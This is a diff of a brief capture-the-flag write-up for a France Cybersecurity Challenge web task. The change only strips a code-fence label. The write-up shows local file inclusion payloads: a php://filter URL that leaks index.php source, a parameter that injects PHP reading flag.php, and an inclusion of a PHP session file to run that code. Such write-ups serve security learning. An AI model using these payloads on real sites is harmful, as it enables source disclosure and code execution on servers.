@@ -1,10 +1,10 @@
 First step: exploit LFI to get the source code of index.php<br />
 Then : 
-```powershell http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=php://filter/convert.base64-encode/resource=index.php```<br />
+```http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=php://filter/convert.base64-encode/resource=index.php```<br />
 
-```powershell http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=<?php echo file_get_contents('flag.php');?>```<br />
+```http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=<?php echo file_get_contents('flag.php');?>```<br />
 
-```powershell http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=sessions/sess_<PHPSESSID```<br />
+```http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=sessions/sess_<PHPSESSID```<br />
 
 Source code: 
 
